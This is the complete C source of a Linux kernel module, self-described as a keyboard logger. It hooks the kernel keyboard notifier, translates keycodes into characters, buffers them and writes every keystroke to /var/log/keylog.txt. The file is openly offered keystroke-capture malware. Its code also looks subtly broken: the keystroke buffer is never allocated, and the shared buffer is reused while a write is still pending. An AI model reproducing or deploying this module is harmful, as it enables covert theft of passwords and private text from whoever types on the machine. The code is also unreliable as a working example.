

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>

#define LOG_FILE "/var/log/keylog.txt"

#define BUFFER_SIZE 64


// Structure to hold keylogger state and data
struct key_logger {
    struct notifier_block nb;       // Notifier block for keyboard events
    struct file *log_file;          // File pointer for logging keystrokes
    struct work_struct writer_task; // Work queue task for writing to file

    char *buffer;                   // Buffer to store captured keystrokes
    size_t buf_len;

    char *write_data;               // Data to be written to file
    size_t write_data_len;

    loff_t file_off;                // Offset for file writes
};

static int keylogger_callback(struct notifier_block *nblock, unsigned long code, void *_param);
static void write_task(struct work_struct *work);
static size_t keycode_to_string(int keycode, int shift, char *buffer, size_t buff_size);
static void flush_buffer(void);

static struct key_logger *logger;

// Special key mappings
// static const char *keymap[256] = {
//     [KEY_ESC] = "[ESC]", [KEY_BACKSPACE] = "[BACKSPACE]", [KEY_TAB] = "[TAB]",
//     [KEY_ENTER] = "[ENTER]", [KEY_LEFTSHIFT] = "[LSHIFT]", [KEY_RIGHTSHIFT] = "[RSHIFT]",
//     [KEY_LEFTCTRL] = "[LCTRL]", [KEY_RIGHTCTRL] = "[RCTRL]", [KEY_LEFTALT] = "[LALT]",
//     [KEY_RIGHTALT] = "[RALT]", [KEY_CAPSLOCK] = "[CAPSLOCK]", [KEY_SPACE] = " ",
//     [KEY_UP] = "[UP]", [KEY_DOWN] = "[DOWN]", [KEY_LEFT] = "[LEFT]", [KEY_RIGHT] = "[RIGHT]"
// };


/* 
 *  Idea from: https://github.com/jarun/spy/blob/master/spy.c
 */
 // Keymap to translate keycodes into human-readable strings
 static const char *keymap[][2] = {
	{"\0", "\0"}, {"[ESC]", "[ESC]"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"[BACKSPACE]", "[BACKSPACE]"},         // 12-14
	{"[TAB]", "[TAB]"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"[LCTRL]", "[LCTRL]"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"[LSHIFT]", "[LSHIFT]"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"[RSHIFT]", "[RSHIFT]"}, {"[PRTSCR]", "[KPD*]"},
	{"[LALT]", "[LALT]"}, {" ", " "}
 };


// Worker function to write buffered keystrokes to the log file
static void write_task(struct work_struct *work) {
    kernel_write(logger->log_file, logger->write_data, logger->write_data_len, &logger->file_off);
    logger->write_data_len = 0;
}

// Flush buffer and schedule write task
static void flush_buffer() {
    logger->write_data = logger->buffer;
    logger->write_data_len = logger->buf_len;
    
    schedule_work(&logger->writer_task);
   
    memset(logger->buffer, 0x0, BUFFER_SIZE);
    logger->buf_len = 0;
}

// Convert keycode to string representation
static size_t keycode_to_string(int keycode, int shift, char *buffer, size_t buff_size) {
    memset(buffer, 0x0, buff_size);
    if(keycode > 0 && keycode <= KEY_SPACE) 
	{
        const char *key_val = keymap[keycode][shift ? 1 : 0];
        size_t len = strlen(key_val);

        snprintf(buffer, buff_size, "%s", key_val);
        return len;
    }
    return 0;
}

// Callback function triggered on key press
static int keylogger_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = (struct keyboard_notifier_param *)_param;

    char temp[16];

    if (!param->down || param->value > KEY_SPACE) return NOTIFY_OK;

    size_t len = keycode_to_string(param->value, param->shift, temp, 16);

    // to flush and write to file whenever we hit ENTER (otherwise waiting to fill up the buffer would be long)
    if(temp[0] == '\n') {
    	logger->buffer[logger->buf_len++] = '\n';
	    flush_buffer();
	    return NOTIFY_OK;
	}

    if (len + logger->buf_len >= BUFFER_SIZE - 1) {
        flush_buffer();
    }
    strncpy(logger->buffer + logger->buf_len, temp, len);
    logger->buf_len += len;
    return NOTIFY_OK;
}


// Module initialization
static int __init keylogger_init(void) {
    printk(KERN_INFO "Keylogger module loaded.\n");

    logger = kzalloc(sizeof(*logger), GFP_KERNEL);
    if (!logger) return -ENOMEM;

    logger->log_file = filp_open(LOG_FILE, O_CREAT | O_RDWR, 0644);
    if (IS_ERR(logger->log_file)) {
        kfree(logger);
        return -EINVAL;
    }

    INIT_WORK(&logger->writer_task, write_task);
    logger->nb.notifier_call = keylogger_callback;
    register_keyboard_notifier(&logger->nb);
    return 0;
}

// Module cleanup
static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&logger->nb);
    fput(logger->log_file);
    kfree(logger);

    printk(KERN_INFO "Keylogger module unloaded.\n");
}


module_init(keylogger_init);
module_exit(keylogger_exit);

// meta
MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Adilet Majit");
MODULE_DESCRIPTION("Linux keyboard logger kernel module");